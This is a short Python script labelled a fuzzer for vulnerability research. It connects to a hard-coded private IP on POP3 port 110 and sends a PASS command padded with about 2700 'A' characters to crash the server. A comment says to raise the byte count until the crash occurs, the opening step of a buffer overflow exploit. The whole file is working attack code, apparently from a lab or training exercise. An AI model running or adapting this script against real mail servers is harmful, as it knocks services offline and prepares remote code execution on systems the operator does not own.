# _FuzzerV2:

"""
INFORMATION ABOUT THE SCRIPT
____________________________

Fuzzer (Vulnerability research)

_____________________________
"""

#!/usr/bin/python3
from socket import *

s = socket(AF_INET, SOCK_STREAM)
buffer = "A" * 2700 # Insert here the bytes range (If you got 2900 so start with 2600,2700,2800,2900 until you get it)

try:
    print("[+] Starting the Crush Validation Test")
    s.connect(("192.168.1.22", 110))

    s.recv(1024)
    s.send("User \r\n".encode())
    s.recv(1024)

    text = 'pass ' + buffer + '\r\n'
    s.send(text.encode())
    print("[+] Finished!")

except Exception as e:
    print("[-] Failed to start the Fuzzer :( ", e)
